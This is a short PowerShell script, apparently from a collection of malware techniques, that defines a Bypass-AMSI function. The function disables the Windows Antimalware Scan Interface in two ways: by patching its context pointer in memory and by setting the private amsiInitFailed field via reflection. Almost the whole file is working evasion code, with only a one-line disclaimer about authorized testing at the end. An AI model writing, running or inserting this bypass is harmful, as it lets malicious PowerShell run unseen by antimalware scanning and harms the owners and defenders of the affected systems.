# AMSI Bypass Example - Memory Patching
# Based on evasion-techniques.md from malware skills

# This script demonstrates AMSI bypass techniques for PowerShell
# Works by patching AMSI in memory to prevent detection

function Bypass-AMSI {
    try {
        # Method 1: Memory patch approach (from the skill)
        $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*iUtils" }
        if ($a) {
            $f = $a.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*Context" }
            if ($f) {
                [IntPtr]$ptr = $f.GetValue($null)
                [Int32[]]$buf = @(0)
                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
                Write-Host "[+] AMSI bypassed via memory patch (Method 1)"
                return $true
            }
        }

        # Method 2: Alternative approach if first fails
        $amsiInit = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsiInit) {
            $amsiField = $amsiInit.GetField('amsiInitFailed','NonPublic,Static')
            if ($amsiField) {
                $amsiField.SetValue($null,$true)
                Write-Host "[+] AMSI bypassed via field modification (Method 2)"
                return $true
            }
        }

        Write-Warning "[-] AMSI bypass failed - AMSI may still be active"
        return $false
    }
    catch {
        Write-Error "[-] Error during AMSI bypass: $_"
        return $false
    }
}

# Example usage:
# Bypass-AMSI

# For demonstration, we'll show what the code does
Write-Host "AMSI Bypass Example"
Write-Host "This script attempts to bypass AMSI (Antimalware Scan Interface)"
Write-Host "To use: Simply call Bypass-AMSI function"
Write-Host ""
Write-Host "Note: This is for educational/authorized testing purposes only."
Write-Host "AMSI is a security feature - bypassing it may violate policies."